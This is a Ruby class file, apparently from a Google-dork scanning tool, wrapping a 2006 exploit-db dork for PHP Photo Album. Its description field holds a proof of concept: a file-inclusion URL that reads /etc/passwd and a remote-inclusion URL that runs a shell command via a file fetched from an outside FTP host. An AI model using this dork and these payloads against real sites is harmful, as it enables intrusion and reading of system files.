module Dorks
   class Dork1333 < Vulpes::Dork

      def initialize
         super({
            name: "Dork 1333",
            ghdb_url: "https://www.exploit-db.com/ghdb/1333",
            severity: "6",
            category: "advisories_and_vulnerabilities.php-photo-album",
            publish_date: "2006-04-15",
            author: "anonymous",
            dork: <<~EDORK,
"powered by php photo album" | inurl:"main.php?cmd=album" -demo2 -pitanje
EDORK
            description: <<~EDESC
dork: "powered by php photo album" | inurl:"main.php?cmd=album" -demo2 -pitanje poc: if register_globals = On & magic_quotes_gpc = Off http://[target]/[path]/language.php?data_dir=/etc/passwd%00 on, php5, if register_globals = on: http://[target]/[path]/language.php?cmd=ls%20-la&data_dir=ftp://Anonymous:fakemail.com@somehost.com/public/ where on ftp you have a translation.dat file with shellcode inside references: http://retrogod.altervista.org/phpalbum_0323_incl_xpl.html http://www.securityfocus.com/bid/17526
EDESC
         })

      end
   end
end
